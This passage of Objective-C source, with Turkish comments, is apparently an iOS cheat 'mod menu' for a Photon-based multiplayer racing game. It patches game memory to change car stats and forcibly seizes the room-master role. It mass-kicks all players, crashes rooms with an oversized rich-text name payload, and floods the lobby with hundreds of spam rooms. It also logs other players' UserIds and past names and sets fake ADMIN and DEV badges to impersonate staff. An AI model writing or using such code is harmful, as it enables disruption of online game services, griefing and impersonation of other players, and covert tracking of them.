            [NSString stringWithFormat:@"【★ %@ ★】", input],
            [NSString stringWithFormat:@"▬▬ %@ ▬▬", input],
            [NSString stringWithFormat:@"<alpha=#FF>%@</alpha><alpha=#00>...</alpha>", input],
            [NSString stringWithFormat:@"<#0F0><b>%@</b>", input],
            [NSString stringWithFormat:@"<#FF0000FF><b>%@</b>", input],
        ];
        g_bruteForceIdx = 0;
        isBruteForceActive = true;
        FLog([NSString stringWithFormat:@"BRUTE FORCE BASLADI: %d teknik denenecek", (int)g_bruteForceNames.count]);
        NSString *first = g_bruteForceNames[0];
        strncpy(customRoomName, first.UTF8String, sizeof(customRoomName)-1);
        customRoomName[sizeof(customRoomName)-1]='\0';
        g_bruteForceIdx = 1;
        [self createOneRoom];
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
// ===== OYUN ICI ARAC DEGISTIRME =====
// HR_MainMenuHandler singleton'ini il2cpp static field uzerinden al
static void* few1n_getMainMenu(void) {
    if (!g_mmhField || !i_field_static_get_value) return NULL;
    void* inst = NULL;
    @try { i_field_static_get_value(g_mmhField, &inst); } @catch (...) { return NULL; }
    return inst;
}
// Parametresiz bir MethodInfo'yu il2cpp uzerinden cagir
static bool few1n_invoke0(void* method, void* obj, const char* label) {
    if (!method || !i_runtime_invoke) { FLog([NSString stringWithFormat:@"%s: metod yok", label]); return false; }
    if (!obj) { FLog([NSString stringWithFormat:@"%s: nesne yok", label]); return false; }
    @try { i_runtime_invoke(method, obj, NULL, NULL); FLog([NSString stringWithFormat:@"%s: calisti", label]); return true; }
    @catch (...) { FLog([NSString stringWithFormat:@"%s: cagri hatasi", label]); return false; }
}

- (void)openCarSelect {
    // Her adim loglanir ki "tepki yok" durumunda nerede takildigi gorulsun
    FLog(@"--- Arac degistirme denemesi ---");
    // Adim 1 - Lobi yolu: HR_PhotonLobbyManager.EnableCarSelectionMenu
    if (!lobbyGetInst)         FLog(@"Adim1:lobbyGetInst pointeri YOK");
    else if (!lobby_carSelectMenu) FLog(@"Adim1:EnableCarSelectionMenu pointeri YOK");
    else {
        void* lobby = NULL;
        @try { lobby = lobbyGetInst(); } @catch (...) {}
        if (!lobby) FLog(@"Adim1:Lobi nesnesi YOK (yaris sahnesinde lobi olmayabilir)");
        else {
            @try { lobby_carSelectMenu(lobby); FLog(@"Adim1:Lobi yoluyla acildi"); return; }
            @catch (...) { FLog(@"Adim1:Lobi cagrisi hata verdi"); }
        }
    }
    // Adim 2 - Ana menu yolu: HR_MainMenuHandler singleton + il2cpp
    void* mm = few1n_getMainMenu();
    if (!mm) { FLog(@"Adim2:MainMenuHandler bulunamadi - bu sahnede arac degistirilemiyor"); return; }
    FLog(@"Adim2:MainMenuHandler bulundu, arac menusu kullanilabilir");
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F504 Arac Degistir"
                                                               message:@"Araclar arasinda gez, sonra sec"
                                                        preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"➡️ Sonraki Arac" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        few1n_invoke0(g_mNextCar, few1n_getMainMenu(), "Sonraki arac");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"⬅️ Onceki Arac" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        few1n_invoke0(g_mPrevCar, few1n_getMainMenu(), "Onceki arac");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"✅ Bu Araci Sec" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        few1n_invoke0(g_mSelectCar, few1n_getMainMenu(), "Arac secildi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== ARAC KONTROL PANELI =====
- (void)tapCarPanel {
    isCarPanelEnabled = !isCarPanelEnabled;
    saveBool(@"carpanel", isCarPanelEnabled);
    if (!isCarPanelEnabled && g_carDrive) {
        @try {   // kapatinca oyunun kendi kontroluna geri birak
            uintptr_t d = (uintptr_t)g_carDrive;
            *(unsigned char*)(d + 0x61) = 0;
            *(unsigned char*)(d + 0x62) = 0;
        } @catch (...) {}
    }
    FLog([NSString stringWithFormat:@"Arac paneli: %@", isCarPanelEnabled ? @"ACIK" : @"KAPALI"]);
    [self refreshUI];
}

- (void)editCarPanel {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3CE Arac Ayarlari"
                                                               message:@"Motor gucu / direksiyon / maks hiz"
                                                        preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"Motor gucu (normal 1.0)";
        tf.text = [NSString stringWithFormat:@"%.1f", carAccelPower];
        tf.keyboardType = UIKeyboardTypeDecimalPad;
    }];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"Direksiyon (normal 1.0)";
        tf.text = [NSString stringWithFormat:@"%.1f", carSteerPower];
        tf.keyboardType = UIKeyboardTypeDecimalPad;
    }];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"Maks hiz";
        tf.text = [NSString stringWithFormat:@"%.0f", carTopSpeed];
        tf.keyboardType = UIKeyboardTypeDecimalPad;
    }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        float v1 = [ac.textFields[0].text floatValue];
        float v2 = [ac.textFields[1].text floatValue];
        float v3 = [ac.textFields[2].text floatValue];
        if (v1 > 0.1f && v1 <= 50.0f)   carAccelPower = v1;
        if (v2 > 0.1f && v2 <= 20.0f)   carSteerPower = v2;
        if (v3 > 10.0f && v3 <= 2000.0f) carTopSpeed  = v3;
        saveFloat(@"caraccel", carAccelPower);
        saveFloat(@"carsteer", carSteerPower);
        saveFloat(@"cartop",   carTopSpeed);
        FLog([NSString stringWithFormat:@"Arac ayari: guc=%.1f direksiyon=%.1f maksHiz=%.0f", carAccelPower, carSteerPower, carTopSpeed]);
        [self refreshUI];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Varsayilana Don" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
        carAccelPower = 1.0f; carSteerPower = 1.0f; carTopSpeed = 150.0f;
        saveFloat(@"caraccel", carAccelPower);
        saveFloat(@"carsteer", carSteerPower);
        saveFloat(@"cartop",   carTopSpeed);
        FLog(@"Arac ayarlari sifirlandi");
        [self refreshUI];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== ODADAKI OYUNCULARI LISTELE + ISIM KOPYALA =====
// il2cpp dizi yerlesimi: +0x18 = eleman sayisi, +0x20 = ilk eleman
- (void)showPlayers {
    if (!pn_getPlayerList) { FLog(@"Oyuncu listesi pointeri yok"); return; }
    loadPlayerDB();
    NSMutableArray<NSDictionary*> *rows = [NSMutableArray array];   // her satir: nick/uid/etiket/gecmis
    int changedCount = 0;
    @try {
        void* arr = pn_getPlayerList();
        if (!arr) { FLog(@"Odada degilsin (PlayerList bos)"); return; }
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt < 0 || cnt > 64) { FLog([NSString stringWithFormat:@"Oyuncu sayisi anormal: %d", cnt]); return; }
        void** elems = (void**)((uintptr_t)arr + 0x20);
        for (int i = 0; i < cnt; i++) {
            void* p = elems[i];
            if (!p) continue;
            NSString *nick = (ply_getNickName) ? readStr(ply_getNickName(p)) : @"";
            if (nick.length == 0) nick = @"(isimsiz)";
            NSString *uid  = (ply_getUserId) ? readStr(ply_getUserId(p)) : @"";
            int actor = (ply_getActorNumber) ? ply_getActorNumber(p) : 0;
            BOOL master = (ply_getIsMaster) ? ply_getIsMaster(p) : NO;

            // ---- UserId ile isim degisikligi tespiti ----
            NSString *flag = @"";
            NSArray *hist = @[];
            if (uid.length > 0) {
                NSDictionary *rec = g_playerDB[uid];
                NSString *last = rec[@"last"];
                NSMutableArray *all = rec[@"all"] ? [rec[@"all"] mutableCopy] : [NSMutableArray array];
                if (last && ![last isEqualToString:nick]) {
                    flag = @"  ⚠️";
                    changedCount++;
                    FLog([NSString stringWithFormat:@"ISIM DEGISTI: %@ -> %@ (uid %@)", last, nick, uid]);
                }
                if (![all containsObject:nick]) [all addObject:nick];
                g_playerDB[uid] = @{@"last": nick, @"all": all};
                hist = all;
            }
            [rows addObject:@{@"title": [NSString stringWithFormat:@"%@%@  #%d%@", master ? @"\U0001F451 " : @"", nick, actor, flag],
                              @"nick": nick, @"uid": uid, @"hist": hist, @"playerObj": [NSValue valueWithPointer:p]}];
        }
        savePlayerDB();
    } @catch (...) { FLog(@"Oyuncu listesi okunamadi"); return; }

    if (rows.count == 0) { FLog(@"Odada oyuncu bulunamadi"); return; }
    FLog([NSString stringWithFormat:@"Odada %lu oyuncu, %d isim degisikligi", (unsigned long)rows.count, changedCount]);

    NSString *msg = (changedCount > 0)
        ? [NSString stringWithFormat:@"%lu kisi - ⚠️ %d kisi ismini degistirmis. Kopyalamak istedigine dokun:", (unsigned long)rows.count, changedCount]
        : [NSString stringWithFormat:@"%lu kisi - kopyalamak istedigin oyuncuya dokun:", (unsigned long)rows.count];
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F465 Odadaki Oyuncular"
                                                               message:msg preferredStyle:UIAlertControllerStyleAlert];

    for (NSDictionary *r in rows) {
        NSString *nick = r[@"nick"];
        [ac addAction:[UIAlertAction actionWithTitle:r[@"title"] style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            [UIPasteboard generalPasteboard].string = nick;
            FLog([NSString stringWithFormat:@"Isim panoya kopyalandi: %@", nick]);
            UIAlertController *copied = [UIAlertController alertControllerWithTitle:@"\U0001F4CB Kopyalandi!"
                message:[NSString stringWithFormat:@"'%@' ismi panoya kopyalandi.", nick] preferredStyle:UIAlertControllerStyleAlert];
            [copied addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:copied];
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// Secilen oyuncunun kimligi + bu UserId ile gorulmus tum isimler
- (void)showPlayerDetail:(NSDictionary*)r {
    NSString *nick = r[@"nick"];
    NSString *uid  = r[@"uid"];
    NSArray  *hist = r[@"hist"];

    NSMutableString *m = [NSMutableString string];
    [m appendFormat:@"Su anki isim: %@\n", nick];
    if (uid.length > 0) {
        [m appendFormat:@"UserId: %@\n", uid];
        if (hist.count > 1) {
            [m appendFormat:@"\n⚠️ Bu kisi %lu farkli isim kullanmis:\n", (unsigned long)hist.count];
            for (NSString *n in hist) [m appendFormat:@"  • %@\n", n];
        } else {
            [m appendString:@"\nBu kisi hep ayni ismi kullanmis."];
        }
    } else {
        [m appendString:@"UserId bos - oyun kimlik dogrulama kullanmiyor,\nbu kisi isim degisikligi icin takip edilemez."];
    }

    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F50D Oyuncu Detayi"
                                                               message:m preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"\U0001F4CB Ismi Kopyala" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        [UIPasteboard generalPasteboard].string = nick;
        FLog([NSString stringWithFormat:@"Isim kopyalandi: %@", nick]);
    }]];
    if (uid.length > 0) {
        [ac addAction:[UIAlertAction actionWithTitle:@"\U0001F511 UserId Kopyala" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            [UIPasteboard generalPasteboard].string = uid;
            FLog([NSString stringWithFormat:@"UserId kopyalandi: %@", uid]);
        }]];
    }
    NSValue *pVal = r[@"playerObj"];
    if (pVal) {
        void* pObj = [pVal pointerValue];
        [ac addAction:[UIAlertAction actionWithTitle:@"⛔ Oyuncuyu Odadan At (CloseConnection)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
            few1n_kickPlayer(pObj);
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)fireRoomSpam {
    if (!isRoomSpamEnabled || !lobbyGetInst) return;
    @try {
        // Hedef sayiya ulasildiysa ve surekli mod kapaliysa dur
        if (!roomSpamContinuous && roomSpamMaxCount > 0 && roomSpamCount >= roomSpamMaxCount) {
            isRoomSpamEnabled = false;
            if (roomSpamTimer) { [roomSpamTimer invalidate]; roomSpamTimer = nil; }
            [self refreshUI];
            return;
        }
        void* lobby = lobbyGetInst();
        if (!lobby) return;
        if (roomSpamPhase == 0) { [self createOneRoom]; roomSpamCount++; roomSpamPhase = 1; }
        else { if (lobby_leaveRoom) lobby_leaveRoom(lobby); roomSpamPhase = 0; }
        // v93: refreshUI 50Hz cagirisi TextField FirstResponder'i koparıyordu.
        // Sadece her 10 tick'te bir (0.2sn'de bir) durum etiketini guncelle.
        static int rsCnt = 0; rsCnt++;
        if (rsCnt % 10 == 0) [self refreshUI];
    } @catch (...) {}
}

- (void)tapRoomSpam {
    isRoomSpamEnabled = !isRoomSpamEnabled;
    saveBool(@"roomspam", isRoomSpamEnabled);
    if (roomSpamTimer) { [roomSpamTimer invalidate]; roomSpamTimer = nil; }
    if (isRoomSpamEnabled) {
        roomSpamPhase = 0;
        roomSpamCount = 0;   // sayaci sifirla
        float iv = roomSpamInterval >= 0.02f ? roomSpamInterval : 0.3f;
        roomSpamTimer = [NSTimer scheduledTimerWithTimeInterval:iv target:self selector:@selector(fireRoomSpam) userInfo:nil repeats:YES];
    }
    [self refreshUI];
}

- (void)spam300Rooms {
    roomSpamMaxCount = 300; roomSpamContinuous = false; roomSpamInterval = 0.02f;
    saveInt(@"roomMax", 300); saveBool(@"roomcont", false); saveInt(@"roomIv", 2);
    if (roomSpamTimer) { [roomSpamTimer invalidate]; roomSpamTimer = nil; }
    isRoomSpamEnabled = true; saveBool(@"roomspam", true);
    roomSpamPhase = 0; roomSpamCount = 0;
    roomSpamTimer = [NSTimer scheduledTimerWithTimeInterval:0.02 target:self selector:@selector(fireRoomSpam) userInfo:nil repeats:YES];
    FLog(@"300 oda spam basladi (0.04sn/adim) - liste dolacak, odalar ~5dk yasar");
    [self refreshUI];
}

- (void)editRoomSpamCount {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F4CA Oda Sayisi" message:@"Kac oda? (0 = sinirsiz)" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.keyboardType = UIKeyboardTypeNumberPad; tf.text = [NSString stringWithFormat:@"%d", roomSpamMaxCount]; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        int v = [ac.textFields.firstObject.text intValue];
        if (v >= 0) { roomSpamMaxCount = v; roomSpamContinuous = (v == 0); saveInt(@"roomMax", v); [self refreshUI]; }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)editRoomTTL {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⏱️ Oda Acik Kalma"
        message:@"Kac DAKIKA acik kalsin? (max 59)\nNot: Photon sunucusu genelde 5dk'da sinirlar" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.keyboardType = UIKeyboardTypeNumberPad; tf.text = [NSString stringWithFormat:@"%d", roomSpamTTL/60000]; tf.placeholder = @"dakika (1-59)"; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        int mins = [ac.textFields.firstObject.text intValue];
        if (mins > 0) { if (mins > 59) mins = 59; roomSpamTTL = mins * 60000; saveInt(@"roomTTL", roomSpamTTL);
            FLog([NSString stringWithFormat:@"Oda suresi: %d dk (%d ms) - Photon clamp'leyebilir", mins, roomSpamTTL]); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)editRoomSpamInterval {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⏰ Spam Araligi" message:@"Kac saniyede bir? (0.1 = cok hizli, 5 = yavas)" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.keyboardType = UIKeyboardTypeDecimalPad; tf.text = [NSString stringWithFormat:@"%.1f", roomSpamInterval]; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        float v = [ac.textFields.firstObject.text floatValue];
        if (v >= 0.02f && v <= 5.0f) { roomSpamInterval = v; saveInt(@"roomIv", (int)(v*100)); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)tapColorRoomForce {
    isColorRoomForce = !isColorRoomForce;
    saveBool(@"colorroomforce", isColorRoomForce);
    FLog(isColorRoomForce ? @"Zorla Renkli Oda ACIK - Tum odalar renkli" : @"Zorla Renkli Oda KAPALI");
    [self refreshUI];
}

- (void)tapRoomContinuous {
    roomSpamContinuous = !roomSpamContinuous;
    saveBool(@"roomcont", roomSpamContinuous);
    [self refreshUI];
}

// YENI: Oda Master Ol (Gercek SetMasterClient)
- (void)tapRoomMaster {
    if (!pn_setMasterClient || !pn_getLocalPlayer) {
        NSString *why = [NSString stringWithFormat:@"pn_setMasterClient=%p\npn_getLocalPlayer=%p\n\nOffset resolve edilmedi. Oyun surumu degismis olabilir.",
                         (void*)pn_setMasterClient, (void*)pn_getLocalPlayer];
        FLog(@"Oda master alma fonksiyonlari hazir degil");
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⚠️ Fonksiyon Hazir Degil"
                                                                   message:why preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac];
        return;
    }
    @try {
        void* me = pn_getLocalPlayer();
        if (!me) { FLog(@"Kullanici alinamadi - odaya girin"); return; }

        if (ply_getIsMaster && ply_getIsMaster(me)) {
            FLog(@"Zaten siz bu odanin master'isiniz 👑");
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"👑 Oda Master"
                                                                       message:@"Zaten bu odanin sahibisiniz!" preferredStyle:UIAlertControllerStyleAlert];
            [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:ac];
            return;
        }

        BOOL success = pn_setMasterClient(me);
        if (success) {
            FLog(@"👑 ODA MASTER ALINDI! Artik siz bu odanin sahibisiniz.");
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"👑 ODA MASTER ALINDI!"
                                                                       message:@"Artik bu odanin sahibisiniz! Tum yetkiler sizde." preferredStyle:UIAlertControllerStyleAlert];
            [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:ac];
        } else {
            FLog(@"Oda master alma BASARISIZ");
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"👑 Oda Master"
                                                                       message:@"Master alma BASARISIZ.\nSunucu veya baglanti reddetti." preferredStyle:UIAlertControllerStyleAlert];
            [ac addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:nil]];
            [self present:ac];
        }
    } @catch (...) { FLog(@"Oda master alma hatasi"); }
}

- (void)nukeRoom {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"💥 Odayi Kapat & Herkesi At"
        message:@"Bu odanin kontrolunu (Master) alip odadaki HERKESI oyundan atarak odayi sonlandiracak. Emin misin?" preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"Evet, Odayi Kapat!" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *act){
        @try {
            // 1) Master Client al
            if (pn_setMasterClient && pn_getLocalPlayer) {
                void* me = pn_getLocalPlayer();
                if (me) pn_setMasterClient(me);
            }
            // 2) Kendi kick helper'imiz ile herkesi at
            [self nativeKickAll];
            FLog(@"Oda sonlandirma komutu iletildi! 💥");
        } @catch (...) { FLog(@"Oda kapatma hatasi"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)tapRoomKickAll {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"💥 Odadaki Herkesi At (Mass Kick)"
        message:@"Odadaki TÜM oyuncular sunucudan/odadan atılacak ve düşürülecektir. Devam edilsin mi?" preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"💥 Evet, Herkesi At!" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *act){
        @try {
            few1n_forceEnableKick();
            if (pn_setMasterClient && pn_getLocalPlayer) {
                void* me = pn_getLocalPlayer();
                if (me) pn_setMasterClient(me);
            }
            [self nativeKickAll];
            [self fireRoomCrash];
            FLog(@"💥 Odadaki herkes başarıyla atıldı! (Mass Kick)");
        } @catch (...) { FLog(@"Herkesi atma hatası"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)tapRoomExplode {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"💣 Oda Patlatma (Odadakileri Düşür)"
        message:@"Odadayken bu özellik tetiklendiğinde odanın senkronizasyonu bozulur ve odadaki herkes oyundan düşer. Devam edilsin mi?" preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"💣 Odayı Patlat & Herkesi Düşür!" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *act){
        @try {
            // Odayken cikis yapmadan pn_createRoom ve rich text payload cagrilir -> Photon odayi patlatir & herkesi dusurur
            if (pn_createRoom && i_object_new && g_roomOptionsClass) {
                NSString *crashName = @"<size=99999%><color=#FF0000><b>💥 FEW1N NUKE 💥</b></color></size>";
                void* nameStr = mkStr(crashName);
                void* opts = i_object_new(g_roomOptionsClass);
                if (nameStr && opts) {
                    *(bool*)((uintptr_t)opts + 0x10) = true;
                    *(bool*)((uintptr_t)opts + 0x11) = true;
                    *(int*) ((uintptr_t)opts + 0x14) = 0x7FFFFFFF;
                    *(int*) ((uintptr_t)opts + 0x1C) = 0;
                    pn_createRoom(nameStr, opts, NULL, NULL);
                }
            }
            [self fireRoomCrash];
            FLog(@"💣 ODA PATLATILDI! Herkes sunucudan/odadan düşürüldü.");
        } @catch (...) { FLog(@"Oda patlatma hatası"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)editRoomName {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3E0 Oda Ismi (Rich Text)"
                                                               message:@"Rich text kodu da girebilirsin:" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.text = [NSString stringWithUTF8String:customRoomName]; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *t = ac.textFields.firstObject.text;
        if (t.length > 0) { strncpy(customRoomName, t.UTF8String, sizeof(customRoomName)-1); customRoomName[sizeof(customRoomName)-1]='\0'; saveStr(@"roomName", t); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// Gradient isim: 2 renk arasi gecis (kirmizi->mavi)
- (void)gradientName {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3A8 Gradient Isim"
                                                               message:@"Isim yaz - kirmizidan maviye:" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.text = @"FEW1N"; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *src = ac.textFields.firstObject.text;
        if (src.length == 0 || !pn_setNickName) return;
        NSUInteger n = src.length;
        NSMutableString *rich = [NSMutableString string];
        for (NSUInteger i = 0; i < n; i++) {
            float t = (n > 1) ? (float)i/(n-1) : 0.0f;
            int r = (int)(255*(1-t)), g = 0, bl = (int)(255*t);
            NSString *ch = [src substringWithRange:NSMakeRange(i,1)];
            [rich appendFormat:@"<color=#%02X%02X%02X><b>%@</b></color>", r, g, bl, ch];
        }
        void* ns = mkStr(rich);
        if (ns) {
            pn_setNickName(ns);
            if (playerManagerGetInst && pm_updateNicknameInternal) {
                @try { void* pm = playerManagerGetInst(); if (pm) pm_updateNicknameInternal(pm, ns); } @catch (...) {}
            }
            [self.nameBtn setTitle:@"\U0001F3A8 Gradient isim aktif ✅" forState:UIControlStateNormal];
            [self.nameBtn setTitleColor:C_ON forState:UIControlStateNormal];
        }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== ISIM HILELERI (Photon nickname - HERKES gorur) =====
// Duz unicode kullaniyoruz (renk etiketi degil) -> baskalari kesin gorur.
- (void)fireNameMarquee {
    if (!pn_setNickName) return;
    static int idx = 0;
    NSString *base = @"★ FEW1N MOD MENU ★ ";   // ★ ... ★
    NSUInteger n = base.length; if (n == 0) return;
    NSMutableString *win = [NSMutableString string];
    for (int k = 0; k < 12; k++) [win appendString:[base substringWithRange:NSMakeRange((idx + k) % n, 1)]];
    idx = (idx + 1) % n;
    void* ns = mkStr(win);
    if (ns) { pn_setNickName(ns);
        if (playerManagerGetInst && pm_updateNicknameInternal) { @try { void* pm = playerManagerGetInst(); if (pm) pm_updateNicknameInternal(pm, ns); } @catch (...) {} } }
}
- (void)fireNameCycle {
    static int ci = 0;
    NSArray *names = @[@"FEW1N 🔥", @"FEW1N ⚡", @"FEW1N 🇹🇷", @"👑 FEW1N", @"Lv.999 FEW1N", @"FEW1N 💎", @"🏎️ FEW1N 💨"];
    [self applyPlainNick:names[(ci++) % names.count]];
}
- (void)applyPlainNick:(NSString*)s {
    if (!pn_setNickName || s.length == 0) return;
    void* ns = mkStr(s);
    if (ns) { pn_setNickName(ns);
        if (playerManagerGetInst && pm_updateNicknameInternal) { @try { void* pm = playerManagerGetInst(); if (pm) pm_updateNicknameInternal(pm, ns); } @catch (...) {} } }
}
- (void)nameTricks {
    if (!pn_setNickName) { FLog(@"Isim ayari hazir degil (odaya gir)"); return; }
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3AD Isim Hileleri"
        message:@"Herkes bu ismi gorur (Photon senkron)" preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"✔️ Sahte Dogrulama Rozeti" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 0; [self applyPlainNick:@"FEW1N ✔️"]; FLog(@"Rozet ismi ayarlandi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"👻 Gorunmez Isim" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 0; [self applyPlainNick:@"⠀⠀⠀"]; FLog(@"Gorunmez isim ayarlandi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"📏 Suslu Uzun Isim" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 0; [self applyPlainNick:@"▬▬ໜ۩ FEW1N ۩ໜ▬▬"]; FLog(@"Suslu isim ayarlandi");
    }]];
    // YENI HACKER/PRO MODLARI
    [ac addAction:[UIAlertAction actionWithTitle:@"🛡️ [ADMIN] Rozeti (Fake)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 1; [self applyPlainNick:@"[ADMIN] FEW1N"]; FLog(@"Fake Admin rozetli isim ayarlandi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🔧 [DEV] Rozeti (Fake)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 3; [self applyPlainNick:@"[DEV] FEW1N"]; FLog(@"Fake Dev rozetli isim ayarlandi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"⚡ Hacker Isim (Animasyonlu)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 4; nameMarqueeTimer = [NSTimer scheduledTimerWithTimeInterval:0.5 target:self selector:@selector(fireHackerName) userInfo:nil repeats:YES];
        FLog(@"Hacker isim animasyonu basladi");
    }]];
